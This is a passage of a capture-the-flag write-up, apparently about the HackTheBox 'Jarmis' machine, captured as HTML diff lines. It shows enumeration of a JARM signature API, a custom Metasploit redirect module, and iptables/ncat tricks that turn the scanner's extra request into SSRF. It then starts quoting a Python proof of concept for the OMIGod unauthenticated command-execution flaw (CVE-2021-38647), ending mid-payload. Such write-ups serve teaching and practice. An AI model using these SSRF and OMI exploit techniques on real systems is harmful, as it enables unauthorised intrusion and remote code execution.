+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="s1">'http://jarmis.htb/api/v1/search/signature/?keyword=2*&amp;max_results=10'</span>
+<span class="go">{"results":[]}
+</span></code></pre></div></div>
+<p>Without knowing all the values, I don’t have a good way to download them.</p>
+<h4 id="by-id">By ID</h4>
+<p>I determined with a quick manual binary search that there are 222 values in the database (assuming they are continuous):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/200
+<span class="go">{"id":200,"sig":"29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e","ismalicious":false,"endpoint":"176.32.103.205:443","note":"amazon.com"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/2000
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/1000
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/500
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/300
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/250
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/225
+<span class="go">null
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/210
+<span class="go">{"id":210,"sig":"21d02d00000000021c21d02d21d21db2e1191a3715fa469c667680e6cfab7f","ismalicious":false,"endpoint":"118.191.216.57:443","note":"sogou.com"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/220
+<span class="go">{"id":220,"sig":"29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365","ismalicious":false,"endpoint":"3.211.157.115:443","note":"netflix.com"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/222
+<span class="go">{"id":222,"sig":"27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30","ismalicious":false,"endpoint":"47.246.24.234:443","note":"login.tmall.com"}
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://jarmis.htb/api/v1/search/id/223
+<span class="go">null
+</span></code></pre></div></div>
+<p>This loop will in less than a minute pull each record and dump it into a file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 222<span class="si">)</span><span class="p">;</span> <span class="k">do </span>curl http://jarmis.htb/api/v1/search/id/<span class="k">${</span><span class="nv">i</span><span class="k">}</span> <span class="nt">-s</span> <span class="o">&gt;&gt;</span> jarms.json<span class="p">;</span> <span class="nb">echo</span> <span class="o">&gt;&gt;</span> jarms.json<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+<h3 id="identify-malicious-jarms">Identify Malicious Jarms</h3>
+<p><code class="language-plaintext highlighter-rouge">jq</code> is the tool to use here. <code class="language-plaintext highlighter-rouge">jq</code> takes JSON data and applies a filter string to manipulate it. I like to work with a base command that looks like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>jarms.json | jq <span class="s1">'.'</span> | less
+</code></pre></div></div>
+<p>I use <code class="language-plaintext highlighter-rouge">less</code> because otherwise data will fill up my terminal (though I’ll show it without for readability here). I start with just <code class="language-plaintext highlighter-rouge">'.'</code> to show everything (pretty printed):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922172320866.webp" type="image/webp"/>
+<img alt="image-20210922172320866" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922172320866.png"/>
+</picture>
+<p>I really want to look at just the malicious signatures, since that’s where it indicated that it would pull metadata:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>jarms.json | jq <span class="s1">'. | select(.ismalicious==true)'</span>
+<span class="go">{
+  "id": 95,
+  "sig": "2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb",
+  "ismalicious": true,
+  "endpoint": "104.24.4.98",
+  "note": "Sliver",
+  "server": "Apache/2.4.40"
+}
+{
+  "id": 128,
+  "sig": "2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb",
+  "ismalicious": true,
+  "endpoint": "185.199.109.153",
+  "note": "SilentTrinity",
+...[snip]...
+</span></code></pre></div></div>
+<p>Perfect. How many are there? <code class="language-plaintext highlighter-rouge">-c</code> will condense each record to one line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>jarms.json | jq <span class="nt">-c</span> <span class="s1">'. | select(.ismalicious==true)'</span> | <span class="nb">wc</span> <span class="nt">-l</span>
+<span class="go">10
+</span></code></pre></div></div>
+<p>I’ll print the IDs and <code class="language-plaintext highlighter-rouge">note</code> for each:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>jarms.json | jq <span class="nt">-c</span> <span class="s1">'. | select(.ismalicious==true) | [.id, .note]'</span> 
+<span class="go">[95,"Sliver"]
+[128,"SilentTrinity"]
+[135,"Ncat"]
+[154,"Metasploit"]
+[170,"Trickbot"]
+[174,null]
+[178,"AsyncRAT"]
+[179,"Sliver"]
+[184,"Gophish"]
+[197,"CobaltStrike"]
+</span></code></pre></div></div>
+<h3 id="identify-request">Identify Request</h3>
+<h4 id="multi-handler">Multi Handler</h4>
+<p>Because Metasploit is in the list, I’ll start that up and see what happens. I started with <code class="language-plaintext highlighter-rouge">exploit/multi/handler</code> with a payload of <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_https</code>, with the <code class="language-plaintext highlighter-rouge">LPORT</code> set to 443. I’ll also start Wireshark. While I won’t be able to see content inside TLS, I can at least count streams.</p>
+<p>When I try to fetch the Jarm, I don’t get anything at MSF, but it returns data:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sig"</span><span class="p">:</span><span class="w"> </span><span class="s2">"07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"ismalicious"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"endpoint"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:443"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"note"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Metasploit"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"server"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Apache"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Interestingly it has a <code class="language-plaintext highlighter-rouge">server</code> field, and it is malicious. In Wireshark, there are 12 TCP streams. The first one is the request from me to Jarmis to submit the url:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210922180026521.webp" type="image/webp"/>
+<img alt="image-20210922180026521" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210922180026521.png"/>
+</picture>
+<p>There there are 11 TLS streams that I can’t read. The fact that there are 11 is interesting. Jarm only requires 10. I’ll want to figure out what the 11th is.</p>
+<h4 id="capture-http">Capture HTTP</h4>
+<p>I also tried the <code class="language-plaintext highlighter-rouge">auxiliary/server/capture/http</code> module, as this is designed to capture HTTP(S) requests. I’ll set TLS on and set the <code class="language-plaintext highlighter-rouge">srvport</code> to 443 and run the server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 auxiliary(server/capture/http) &gt;</span><span class="w"> </span>run
+<span class="go">[*] Auxiliary module running as background job 1.
+[*] Started service listener on 0.0.0.0:443 
+[*] Server started.
+</span></code></pre></div></div>
+<p>When I submit my URL, there’s a hit on the server (sometimes):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] HTTP REQUEST 10.10.11.117 &gt; 10.10.14.6:80 GET / Unknown   cookies=
+</code></pre></div></div>
+<p>Interestingly, if I run this module before I run the multi handler, it crashes rather than showing the connection, but for some reason running multi handler first stabilizes it. I can’t explain this.</p>
+<p>Either way, the resulting JSON is the same, and a bit different from above:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sig"</span><span class="p">:</span><span class="w"> </span><span class="s2">"07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"ismalicious"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"endpoint"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:443"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"note"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Metasploit?"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"server"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>It doesn’t show malicious, but suggests maybe Metasploit. The server field is present but empty.</p>
+<p>This scan also consists of 11 requests.</p>
+<h3 id="redirect">Redirect</h3>
+<h4 id="strategy">Strategy</h4>
+<p>I know that JARMs use 10 TLS requests to create the signature. I’ve noticed that when a JARM is malicious, there’s an 11th request. It seems likely related to this line from <code class="language-plaintext highlighter-rouge">/docs</code>:</p>
+<blockquote>
+<p>Full collisions are possible.  That is why this service also utilzies metadata when deconfliction is necessary.</p>
+</blockquote>
+<p>I’ll show the code that’s generating these requests in <a href="#general">Beyond Root</a>.</p>
+<p>I want to redirect this 11th request to see what it is and if I can turn it into SSRF. I’ll show two strategies for this, using Metasploit and <code class="language-plaintext highlighter-rouge">ncat</code>.</p>
+<h4 id="metasploit">Metasploit</h4>
+<p>I’ll create a custom Metasploit module to see if I can redirect that last request. Metasploit modules go into <code class="language-plaintext highlighter-rouge">~/.msf4/modules</code>. Because I’ll run <code class="language-plaintext highlighter-rouge">msfconsole</code> as root (to listen on low ports, etc), I’ll need to work from <code class="language-plaintext highlighter-rouge">/root/.msf4</code>, so I’ll just get a console as root for this development.</p>
+<p>First, I’ll make a directory</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@parrot#</span><span class="w"> </span><span class="nb">sudo mkdir</span> <span class="nt">-p</span> /root/.msf4/modules/auxiliary/server/
+</code></pre></div></div>
+<p>Now I’ll start with another module that can listen on 443 and do a redirect, <code class="language-plaintext highlighter-rouge">auxiliary/server/capture/http_basic</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@parrot#</span><span class="w"> </span><span class="nb">cp</span> /usr/share/metasploit-framework/modules/auxiliary/server/capture/http_basic.rb /root/.msf4/modules/auxiliary/server/jarmisRedirect.rb
+</code></pre></div></div>
+<p>This module has four functions:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">initialize</code> - sets metadata</li>
+<li><code class="language-plaintext highlighter-rouge">support_ipv6</code> - returns <code class="language-plaintext highlighter-rouge">false</code></li>
+<li><code class="language-plaintext highlighter-rouge">run</code> - sets variables and calls <code class="language-plaintext highlighter-rouge">exploit</code></li>
+<li><code class="language-plaintext highlighter-rouge">report_creds</code> - saves creds</li>
+<li><code class="language-plaintext highlighter-rouge">on_request</code> - handles incoming HTTP(S) request</li>
+</ul>
+<p>I’ll delete <code class="language-plaintext highlighter-rouge">report_creds</code> entirely. <code class="language-plaintext highlighter-rouge">on_request</code> is where I’ll do my redirect. Currently, it looks like:</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">on_request_uri</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">req</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">req</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">]</span> <span class="ow">and</span> <span class="n">req</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">/basic/i</span><span class="p">)</span>
+      <span class="n">basic</span><span class="p">,</span><span class="n">auth</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sr">/\s+/</span><span class="p">)</span>
+      <span class="n">user</span><span class="p">,</span><span class="n">pass</span>  <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">decode_base64</span><span class="p">(</span><span class="n">auth</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+      <span class="n">report_cred</span><span class="p">(</span>
+        <span class="ss">ip: </span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="p">,</span>
+        <span class="ss">port: </span><span class="n">datastore</span><span class="p">[</span><span class="s1">'SRVPORT'</span><span class="p">],</span>
+        <span class="ss">service_name: </span><span class="s1">'HTTP'</span><span class="p">,</span>
+        <span class="ss">user: </span><span class="n">user</span><span class="p">,</span>
+        <span class="ss">password: </span><span class="n">pass</span><span class="p">,</span>
+        <span class="ss">proof: </span><span class="n">req</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">]</span>
+      <span class="p">)</span>
+
+      <span class="n">print_good</span><span class="p">(</span><span class="s2">"HTTP Basic Auth LOGIN </span><span class="si">#{</span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="si">}</span><span class="s2"> </span><span class="se">\"</span><span class="si">#{</span><span class="n">user</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">pass</span><span class="si">}</span><span class="se">\"</span><span class="s2"> / </span><span class="si">#{</span><span class="n">req</span><span class="p">.</span><span class="nf">resource</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+      <span class="k">if</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">]</span>
+        <span class="n">print_status</span><span class="p">(</span><span class="s2">"Redirecting client </span><span class="si">#{</span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="si">}</span><span class="s2"> to </span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">send_redirect</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">])</span>
+      <span class="k">else</span>
+        <span class="n">send_not_found</span><span class="p">(</span><span class="n">cli</span><span class="p">)</span>
+      <span class="k">end</span>
+    <span class="k">else</span>
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Sending 401 to client </span><span class="si">#{</span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+      <span class="n">response</span> <span class="o">=</span> <span class="n">create_response</span><span class="p">(</span><span class="mi">401</span><span class="p">,</span> <span class="s2">"Unauthorized"</span><span class="p">)</span>
+      <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'WWW-Authenticate'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Basic realm=</span><span class="se">\"</span><span class="si">#{</span><span class="vi">@realm</span><span class="si">}</span><span class="se">\"</span><span class="s2">"</span>
+      <span class="n">cli</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+<p>I don’t need the auth check, so I’ll reduce it to just do a redirect as long as the <code class="language-plaintext highlighter-rouge">RedirectURL</code> is set:</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">on_request_uri</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">req</span><span class="p">)</span>    
+    <span class="k">if</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">]</span>    
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Redirecting client </span><span class="si">#{</span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="si">}</span><span class="s2"> to </span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>    
+      <span class="n">send_redirect</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'RedirectURL'</span><span class="p">])</span>    
+    <span class="k">else</span>    
+      <span class="n">send_not_found</span><span class="p">(</span><span class="n">cli</span><span class="p">)</span>    
+    <span class="k">end</span>    
+  <span class="k">end</span>   
+</code></pre></div></div>
+<p>Other than that, I’ll just update the metadata and how the options are set. The full script can be found as <a href="/files/jarmis-msf-mod.rb">jarmis-msf-mod.rb</a>.</p>
+<p>In MSF, I can exit and start it again, or run <code class="language-plaintext highlighter-rouge">reload_all</code> to get the new module. It’s there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 &gt;</span><span class="w"> </span>search jarmis
+<span class="go">
+Matching Modules
+================
+
+</span><span class="gp">   #</span><span class="w">  </span>Name                             Disclosure Date  Rank    Check  Description
+<span class="go">   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/server/jarmisRedirect                   normal  No     Redirect Jarmis Scanner to something else
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/jarmisRedirect
+
+</span><span class="gp">msf6 &gt;</span><span class="w"> </span>use 0
+<span class="gp">msf6 auxiliary(server/jarmisRedirect) &gt;</span><span class="w"> </span>options
+<span class="go">
+Module options (auxiliary/server/jarmisRedirect):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   RedirectURL                   yes       The page to redirect users to
+   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT      443              yes       The local port to listen on.
+   SSL          true             yes       Negotiate SSL for incoming connections
+   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                       no        The URI to use for this exploit (default is random)
+
+
+Auxiliary action:
+
+   Name      Description
+   ----      -----------
+   Redirect  Run redirect web server
+</span></code></pre></div></div>
+<p>I’ll try giving a redirect to my own host and run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 auxiliary(server/jarmisRedirect) &gt;</span><span class="w"> </span><span class="nb">set </span>srvhost tun0
+<span class="gp">srvhost =&gt;</span><span class="w"> </span>10.10.14.6
+<span class="gp">msf6 auxiliary(server/jarmisRedirect) &gt;</span><span class="w"> </span><span class="nb">set </span>redirecturl http://10.10.14.6/test
+<span class="gp">redirecturl =&gt;</span><span class="w"> </span>http://10.10.14.6/test
+<span class="gp">msf6 auxiliary(server/jarmisRedirect) &gt;</span><span class="w"> </span>run
+<span class="go">[*] Auxiliary module running as background job 0.
+[*] Using URL: https://10.10.14.6:443/kQcebI79N1
+[*] Server started.
+</span></code></pre></div></div>
+<p>When I give that url to Jarmis (the full URL including <code class="language-plaintext highlighter-rouge">/kQcebI79N1</code> or MSF won’t route it to this listener), after a couple seconds there’s a hit at MSF:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Redirecting client 10.10.11.117 to http://10.10.14.6/test
+</code></pre></div></div>
+<p>And then a hit on a Python webserver I’m running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]#</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.117 - - [23/Sep/2021 09:47:19] code 404, message File not found
+10.10.11.117 - - [23/Sep/2021 09:47:19] "GET /test HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<h4 id="iptables--ncat">iptables / ncat</h4>
+<p>I noted earlier that <code class="language-plaintext highlighter-rouge">ncat</code> without the <code class="language-plaintext highlighter-rouge">-k</code> option was detected as malicious, but when I added <code class="language-plaintext highlighter-rouge">-k</code>, it wasn’t known by the DB. They are different because without just fills in nulls for the next nine requests, whereas the <code class="language-plaintext highlighter-rouge">-k</code> gives values:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>JARM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>no <code class="language-plaintext highlighter-rouge">-k</code></td>
+<td><code class="language-plaintext highlighter-rouge">21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46</code></td>
+</tr>
+<tr>
+<td><code class="language-plaintext highlighter-rouge">-k</code></td>
+<td><code class="language-plaintext highlighter-rouge">21d19d00021d21d00042d43d000000107066a9db8d16b0a001ff4969166ce7</code></td>
+</tr>
+</tbody>
+</table>
+<p>If I can run <code class="language-plaintext highlighter-rouge">nc</code> without the <code class="language-plaintext highlighter-rouge">-k</code>, letting it respond to the first request, fail on the next nine, and then redirect on the last, I could get the same behavior I got with MSF.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">iptables</code> to do this with the following commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>iptables <span class="nt">-F</span> <span class="nt">-t</span> nat
+<span class="nb">sudo </span>iptables <span class="nt">-I</span> PREROUTING <span class="nt">-t</span> nat <span class="nt">-p</span> tcp <span class="nt">--dport</span> 443 <span class="nt">-m</span> statistic <span class="nt">--mode</span> nth <span class="nt">--every</span> 11 <span class="nt">--packet</span> 10 <span class="nt">-j</span> REDIRECT <span class="nt">--to-port</span> 8443
+</code></pre></div></div>
+<p>The first will just clear the <code class="language-plaintext highlighter-rouge">nat</code> table, which is important to reset the counters (and a good command to run once I’m done with the box to reset these rules).</p>
+<p>The second will look for traffic incoming to port 443 and then use the statistics mode to send every 11th packet to 8443.</p>
+<p>I’ll run these and start <code class="language-plaintext highlighter-rouge">ncat</code> TLS listeners on both 443 and 8443. When I give my IP to Jarmis, I first see the hit on <code class="language-plaintext highlighter-rouge">ncat</code> on 443:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]#</span><span class="w"> </span>nc <span class="nt">--ssl</span> <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: ACB6 84C7 BE48 EB21 CA98 BAF7 6887 1DD4 3E1F 736A
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:47724.
+Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
+</span></code></pre></div></div>
+<p>Then a second or two later on 8443:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]#</span><span class="w"> </span>nc <span class="nt">--ssl</span> <span class="nt">-lnvp</span> 8443
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: A61B 19A8 8652 BA80 3C3E F71E EE41 7909 99B3 B456
+Ncat: Listening on :::8443
+Ncat: Listening on 0.0.0.0:8443
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:47768.
+GET / HTTP/1.1
+Host: 10.10.14.6
+User-Agent: curl/7.74.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</span></code></pre></div></div>
+<h2 id="omigod">OMIGod</h2>
+<h3 id="python-poc">Python POC</h3>
+<p><a href="https://github.com/horizon3ai/CVE-2021-38647">This GitHub</a> has a POC for CVE-2021-38647. The background about the CVE is that the Microsoft implementation of <a href="https://github.com/microsoft/omi">Open Management Infrastructure</a> didn’t handle missing auth headers well, and just let it work.</p>
+<p>The POC just involves sending a POST request to 5986 (with TLS) or 5985 (without) with a SOAP XML request in the body:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/soap+xml;charset=UTF-8</span><span class="sh">'</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">https://</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">:5986/wsman</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">DATA</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;p:StdOut&gt;(.*)&lt;/p:StdOut&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">error</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;p:StdErr&gt;(.*)&lt;/p:StdErr&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">output</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">'</span><span class="s">&amp;#10;</span><span class="sh">'</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">error</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">error</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">error</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">'</span><span class="s">&amp;#10;</span><span class="sh">'</span><span class="p">))</span>
+</code></pre></div></div>
+<p>The body will have:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DATA</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">&lt;s:Envelope xmlns:s=</span><span class="sh">"</span><span class="s">http://www.w3.org/2003/05/soap-envelope</span><span class="sh">"</span><span class="s"> xmlns:a=</span><span class="sh">"</span><span class="s">http://schemas.xmlsoap.org/ws/2004/08/addressing</span><span class="sh">"</span><span class="s"> xmlns:h=</span><span class="sh">"</span><span class="s">http://schemas.microsoft.com/wbem/wsman/1/windows/shell</span><span class="sh">"</span><span class="s"> xmlns:n=</span><span class="sh">"</span><span class="s">http://schemas.xmlsoap.org/ws/2004/09/enumeration</span><span class="sh">"</span><span class="s"> xmlns:p=</span><span class="sh">"</span><span class="s">http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd</span><span class="sh">"</span><span class="s"> xmlns:w=</span><span class="sh">"</span><span class="s">http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span><span class="sh">"</span><span class="s"> xmlns:xsi=</span><span class="sh">"</span><span class="s">http://www.w3.org/2001/XMLSchema</span><span class="sh">"</span><span class="s">&gt;
+   &lt;s:Header&gt;
+      &lt;a:To&gt;HTTP://192.168.1.1:5986/wsman/&lt;/a:To&gt;
+      &lt;w:ResourceURI s:mustUnderstand=</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="s">&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&lt;/w:ResourceURI&gt;
+      &lt;a:ReplyTo&gt;
